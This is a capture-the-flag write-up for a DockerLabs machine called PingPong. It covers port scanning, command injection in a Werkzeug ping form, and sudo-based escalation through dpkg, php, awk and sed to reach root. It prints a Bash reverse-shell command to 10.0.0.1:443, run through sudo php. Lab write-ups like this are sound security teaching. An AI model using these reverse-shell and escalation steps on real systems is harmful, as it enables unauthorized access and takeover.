# PingPong

<center><img src="https://dockerlabs.es/static/images/logos/logo.png" width="150px"></center>

## Contents

- [Reconnaissance](#reconnaissance)
- [Scanning](#scanning)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)

## Reconnaissance

The target machine is correctly deployed inside the lab network (in this case, using Docker).  
To identify it, `arp-scan` was used to find devices in our Docker network using the `docker0` interface.

```bash
sudo arp-scan -I docker0 --localnet
Interface: docker0, type: EN10MB, MAC: 02:42:77:20:48:b6, IPv4: 172.17.0.1
Starting arp-scan 1.10.0 with 65536 hosts (https://github.com/royhills/arp-scan)
172.17.0.2	02:42:ac:11:00:02	(Unknown: locally administered)
```

## Scanning

A scan was performed using **Nmap** to identify open ports and running services:

```bash
nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
```

The **target** corresponds to the victim machine’s IP: **172.17.0.2**

Main results:

- Port **80** open (Apache)
- Port **443** open (Apache)
- Port **5000** open running a Python application (Werkzeug)

![Scan1](https://i.imgur.com/racpOYG.png)

## Enumeration

Ports **80** and **443** were checked in the browser, but the servers did not provide relevant information.

![Scan1](https://i.imgur.com/YS628ZP.png)

The next step was to search for hidden directories and resources using **Gobuster**:

```bash
gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
```

The result didn’t show many directories; `machine.php` was inspected, but nothing relevant was found.

![Gobuster](https://i.imgur.com/JJOzxTm.png)
![Machine](https://i.imgur.com/yod5G0O.png)

Then we moved to port **5000**, where we found an application that performs ping requests to hosts via an HTML input — apparently unsanitized. Because of this, **Command Injection** tests were conducted to extract system information.

![Werkzeug1](https://i.imgur.com/37eesfV.png)
![Werkzeug1](https://i.imgur.com/MY85DKb.png)

## Exploitation

Since the results were positive, a **reverse shell** using Bash was executed to gain terminal access.

![Werkzeug1](https://i.imgur.com/s6zQY5h.png)  
![Werkzeug2](https://i.imgur.com/sW9IsW7.png)

## Privilege Escalation

After establishing the reverse shell, the environment was analyzed to determine how to escalate privileges.

SUID binaries were searched for:

```bash
find / -perm -4000 2>/dev/null
```

![SUID](https://i.imgur.com/PPXa0is.png)

Although some binaries weren’t exploitable, it was observed that `/usr/bin/dpkg` could be executed by the user `bobby`, suggesting a possible **lateral movement**. According to [GTFObins](https://gtfobins.github.io/gtfobins/dpkg/#sudo), we can see how to leverage `dpkg`.

Some adjustments were made to the terminal to avoid errors when executing commands:

```
- script /dev/null -c bash
- stty raw -echo; fg
	reset xterm
- CTRL + z to background the shell
- export TERM=xterm
- export SHELL=bash
- stty rows 47 columns 189
```

Running the commands to use `dpkg`:

```bash
sudo -u bobby /usr/bin/dpkg -l
```

![dpkg](https://i.imgur.com/YaJalta.png)
![dpkg](https://i.imgur.com/VKCKnWA.png)

After obtaining the `bobby` user, the same binary check process was repeated, leading to the discovery of another user: `gladys`.

![dpkg](https://i.imgur.com/3JNwdWo.png)

A PHP command was executed to launch another **reverse shell** and connect as `gladys`:

```bash
CMD='/bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/443 0>&1\''
sudo -u gladys /usr/bin/php -r "system('$CMD');"
```

Now as `gladys`, the process was repeated, using [GTFObins](https://gtfobins.github.io/gtfobins/cut/#sudo) to check for exploitable binaries. In the `/opt/` directory, a flag was found that was used to move to the next user: `chocolatito`.

![dpkg](https://i.imgur.com/Iuf675b.png)

After obtaining the `chocolatito` user, new binaries were searched again, and in this case, [awk](https://gtfobins.github.io/gtfobins/awk/#sudo) allowed escalation to the next user: `theboss`.

![dpkg](https://i.imgur.com/ZeyEw1O.png)

Using the same method, it was found that this particular user could finally gain **root** access through [sed](https://gtfobins.github.io/gtfobins/sed/#sudo).

![dpkg](https://i.imgur.com/ItDzxDz.png)

After performing several lateral movements, **root** was finally obtained.

---

_Written by **kur0bai**_
